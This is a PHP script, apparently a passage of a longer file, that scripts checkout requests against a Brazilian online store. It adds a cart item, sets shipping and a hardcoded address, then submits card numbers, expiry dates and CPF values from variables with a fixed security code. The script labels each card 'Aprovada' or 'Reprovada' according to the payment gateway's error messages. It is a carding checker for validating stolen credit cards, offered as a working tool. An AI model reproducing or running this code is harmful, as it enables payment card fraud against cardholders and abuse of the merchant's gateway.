//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/produto/177190/anel-de-vedacao-pacote-com-3-un',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'metodo=add_item_carrinho&param1={"idproduto":"177190","Loja":{"idloja":"218","nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"Marca":{"idmarca":"","Loja":{"idloja":null,"nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"nome":"","seo_idseo":null,"seo_titulo":null,"seo_tags":null,"seo_descricao":null,"logotipo":null,"imgshare":null,"arquivosss":null,"posicao":null},"liberado":"1","nome":"","preco":"59.85","precopromo":"0","peso":"0.15","fretegratis":"2","tementrega":"1","altura":"5","largura":"5","profundidade":"5","fotos":["20200608144736_aneltotal.jpg",""],"temsubproduto":"1","depto":null,"deptonome":null,"secao":null,"secaonome":null,"subsecao":null,"subsecaonome":null,"codigos":" ","seo_idseo":"","seo_titulo":"","seo_tags":"","seo_descricao":"","idprodutoareahome":null,"estoqueexterno":"0","dtcadastro":null,"vendas":null,"views":null,"tipo":"0","baixarestoqueprodutokit":"1","urlvideo":"https://youtu.be/VKwTqNXhP_8","variacao":"0","variacoes":null,"atributos":null,"caracteristicas":null,"naocomercialonline":"0","lancamento":"0","promocaodesconto":"","promocaonome":"","promocaoflag":"","promocaoflagbg":"","promocaoflagfonte":"","promocaoviaurl":null,"promocaoid":null,"naoprecisasalvar":null,"dtatualizacao":"2023-01-21 16:02:00","servico":"0","dtinicial":"0000-00-00 00:00:00","dtfinal":"0000-00-00 00:00:00","dtevento":"0000-00-00","tipodt":"","ncm":"","nbm":"","importado":"0","garantia":"0","ean":"","Precoqtdpersonalizado":{"idprecoqtdpersonalizado":"","Loja":{"idloja":null,"nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"calcularprecopor":null,"infocliente":null,"vendidopor":null,"vendidoporplural":null,"tiposelecao":null,"tipocampo2":null,"lado1descricao":null,"lado1valorinicial":null,"lado1valorfinal":null,"lado2descricao":null,"lado2valorinicial":null,"lado2valorfinal":null,"intervaloentrevalores":null,"tiposelecaoqtd":null},"precoqtdpersonalizadoqtdmin":"0","prazoentrega":"0","temmultiprecos":null,"Subloja":{"idsubloja":"","nome":"","logotipo":null,"banner":null,"sobre":null,"endereco":null,"telefone1":null,"telefone2":null,"telefone3":null,"email":null,"Loja":{"idloja":null,"nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"Cliente":{"idcliente":null,"Loja":{"idloja":null,"nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"tipo":null,"Pessoafisica":{"idpessoafisica":null,"nome":null,"sobrenome":null,"apelido":null,"cpf":null,"rg":null,"dtnascimento":null,"sexo":null,"email":null,"inscricaoprodutorrural":null,"crm":null},"Pessoajuridica":{"idpessoajuridica":null,"razaosocial":null,"nomefantasia":null,"cnpj":null,"ie":null,"responsavel":null},"telefone":null,"telefone2":null,"email":null,"senha":null,"liberado":null,"Endereco":{"idendereco":null,"cep":null,"tipo":null,"logradouro":null,"numero":null,"complemento":null,"bairro":null,"cidade":null,"uf":null,"nome":null,"telefone":null,"pais":null,"ibge":null},"idenderecocliente":null,"nomeoficial":null,"documento":null,"atacado":null,"Atacadotabela":{"idatacadotabela":null,"nome":null,"qtdminima":null,"precominimo":null,"desconto":null,"Loja":{"idloja":null,"nome":null,"url":null,"bloqueado":null,"urlsecundaria":null},"tipodesconto":null,"tipopreco":null},"htmlatacado":null,"dtcadastro":null,"notas":null,"pushid":null,"uuid":null,"hash":null,"nomec":null,"bloqueado":null,"cookies":null},"liberado":null},"template":"0","esgotado":null,"googleshopping":null,"skyhub":null,"descricao":null,"categoriamarketplace":null,"gtin":"","mpn":"","descricaomktplaces":"","descricaosemformatacao":"","stridlistapresente":null,"aluguel":"0","excluido":"0","labelselecioneumaopcao":"","totalitensinclusos":"1","local":"","cidade":"","urllocalizacao":"","imgvoucher":[""],"marketplaces":null,"descricaovariacao":null,"codigovariacao":null,"idsubproduto":null,"arquivos":[""],"restritoaoleitoronline":"0","arquivosvenda":[""],"virtual":"0","urlprodutovirtual":"","statusmktplaces":null,"relevancia":"0","isbn":"","genero":"","faixaetaria":"","precoatacado":"","shopmania":null,"facebook":null,"skupai":null,"opcionaislabel":"Opcionais","estoque":null,"labellistagem":"","naopermiteretiradanaloja":"0","agrupador":"","temgrade":null,"personalizacaocomestoque":"0","vendidoemqtd":"1","minimoitens":"1","url":"","idoldstore":"","asin":"","tempersonalizacaoupload":"","tipoprecokit2":"e","crossdocking":"0","enviamarketplaces":"1","gerarassinatura":"0","fotos2":[""],"certificacao":"0","codtributacao":"","seo_titulo1":"","seo_tags1":"","seo_descricao1":"","flags":null}&param2=220542&param3=1&param4=&param5=&param6=0&param7=&param8=&param11=&param12=');
$item = curl_exec($ch);




########CEP


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/mediaplus/controller/cpcontroller");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/carrinho',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'metodo=get_opcoes_frete&param1=1&param2=72547511');
$cep = curl_exec($ch);


#/#######FRETE
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/mediaplus/controller/cpcontroller");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/carrinho',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'metodo=seta_frete&param1=jadlog_package&param2=72547511');
$envio = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/checkout-endereco");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'dnt: 1',
'X-Requested-With: mark.via.gp',
'Sec-Fetch-Site: none',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://easytdr.com.br/carrinho',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$endereco = curl_exec($ch);






$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/endereco");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: text/html, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/checkout-endereco',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'salvar_endereco=true&idendereco=&cep1=72547&cep2=511&tipoendereco=-&logradouro=QR+217+Conjunto+K&nuendereco=1&complemento=&bairro=Santa+Maria&cidade=Bras%C3%ADlia&uf=DF');
$salvaendereco = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/pedido/indefinido/0");
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'dnt: 1',
'X-Requested-With: mark.via.gp',
'Sec-Fetch-Site: none',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://easytdr.com.br/checkout-endereco',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 $toke = curl_exec($ch);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/finalizar-pedido/$urltoken_atual");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'X-Requested-With: mark.via.gp',
'Referer: https://easytdr.com.br/posts/pedido/indefinido/0',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$token1 = curl_exec($ch);







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/pedido-finalizar");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/finalizar-pedido/'.$urltoken_atual.'',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'enviando_via_post=1&formapagto=rede-'.$bandeira.'&numparcelas=1&cartaocredito_num='.$cc.'&cartaocredito_codigo=789&cartaocredito_mes='.$mes.'&cartaocredito_ano='.$ano.'&cartaocredito_nome=Kleber oliveira&cartaocredito_cpf='.$cpf.'&cartaocredito_dtnascimento=23/07/2002&card_hash=&sender_hash=&_cc_chave_=');
$pay = curl_exec($ch);



$retorno = getStr($pay, 'Unauthorized. ','*' , 1);


if (strpos($pay, 'Invalid security code')) { 
    die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span> $lista  ✓Retorno:  TRANSAÇÃO REALIZADA COM SUCESSO <br>GATE: $gate <br></span></b>");


} elseif (strpos($pay, 'Expiry date expired')) { 
    die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span> $lista ✓ReturnCode: 54 LIVE INSTAVEL<br>GATE: $gate <br></span></b>");

    
} elseif(strpos($pay, 'Please contact the Card Issuer.')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span> $lista <br>Retorno:  LIVE INSTÁVEL <br>GATE: $gate <br></span></b>");


} elseif(strpos($pay, 'Identified moderate risk by the issuer.')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span><br> $lista <br>Retorno: ReturnCode 63 LIVE INSTAVEL <br>GATE: $gate </span><br></b>");
   
 


} elseif(strpos($pay, 'Insufficient funds')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ReturnCode: 51 <br>GATE: $gate </span><br></b>");}


########aguardando amex live pra tirar retorno
/*elseif(strpos($pay, '')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Aprovada</span><br> $lista <br>Retorno:  Live INSTÁVEL <br>

GATE: $gate</span><br></b>");}*/

elseif(strpos($pay, 'Deny Category 01')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ANTI-FRAUDE <br>GATE: $gate </span><br></b>");}

elseif(strpos($pay, 'Transaction type not allowed for this card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>TIPO DE TRANSAÇÃO NÃO ACEITA PELO CARTÃO <br>GATE: $gate </span><br></b>");}

elseif(strpos($pay, 'Card locked')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO BLOQUEADO <br>GATE: $gate</span><br></b>");}

elseif(strpos($pay, 'Please try again')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>PAGAMENTO RECUSADO<br>GATE: $gate </span><br></b>");}

elseif(strpos($pay, 'Restricted card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO RESTRITO<br>GATE: $gate </span><br></b>");}

elseif(strpos($pay, 'Nonexistent card')){ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>CARTÃO INEXISTENTE<br>GATE: $gate </span><br></b>");}

else{ 
die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reprovada</span><br> $lista <br>ERRO DESCONHECIDO <br>
 </span><br></b>");

    
}




/*By: 

GATE: $gate

Deixa os creditos amor s2*/


?>